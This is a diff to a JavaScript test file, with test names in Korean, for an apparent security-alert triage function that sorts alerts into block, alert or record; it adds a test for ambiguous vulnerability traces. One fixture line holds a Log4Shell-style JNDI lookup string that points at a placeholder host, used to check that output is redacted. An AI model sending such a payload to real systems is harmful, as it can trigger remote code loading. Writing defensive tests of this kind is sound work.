@@ -78,7 +78,7 @@ test('R14·R15: 전체 경보·잘못된 입력을 동기 처리하고 원문·�
   const { decide } = isolated();
   const outputs = fixture.alerts.map(decide);
   assert.ok(outputs.slice(0, 8).every(output => output.action === 'block'));
-  assert.ok(outputs.slice(8, 16).every(output => output.action !== 'block'));
+  assert.ok(outputs.slice(8, 16).every(output => output.action === 'alert'));
   assert.ok(outputs.slice(16).every(output => output.action === 'record'));
   const reversed = fixture.alerts.slice().reverse().map(decide).reverse();
   assert.deepEqual(outputs, reversed);
@@ -94,6 +94,23 @@ test('R14·R15: 전체 경보·잘못된 입력을 동기 처리하고 원문·�
   const secretOutput = decide({ data: { useragent: '${jndi:ldap://example.invalid/fixture-canary}',
     token: 'fixture-canary' }, rule: { description: 'token=fixture-canary' } });
   assert.doesNotMatch(JSON.stringify(secretOutput), /fixture-canary/u);
+});
+
+test('X03_AMBIGUOUS_NOT_ALERT: 약한 취약점 흔적은 알림만 남기고 일반 정상 설명은 기록한다', () => {
+  const { decide } = isolated();
+  for (const description of [
+    '취약점 목록 문서를 한 번 열었습니다.',
+    '머리글에 중괄호가 한 번 있습니다. 원격 조회 구문은 없습니다.',
+    '점검 도구와 비슷한 수업용 프로그램 이름이 1건 있습니다.',
+    '라이브러리 이름이 로그에 한 번 있습니다. 악용 구문은 없습니다.',
+  ]) {
+    const output = decide({ rule: { description } });
+    assert.equal(output.action, 'alert');
+    assert.equal(output.confidence, 0.5);
+  }
+  for (const description of ['공개 화면을 열었습니다.', '내 메모를 조회했습니다.', '로그인이 성공했습니다.']) {
+    assert.equal(decide({ rule: { description } }).action, 'record');
+  }
 });
 
 test('R7·R8: 패턴마다 이름·조건·한 줄 근거·공식 출처가 있다', async () => {
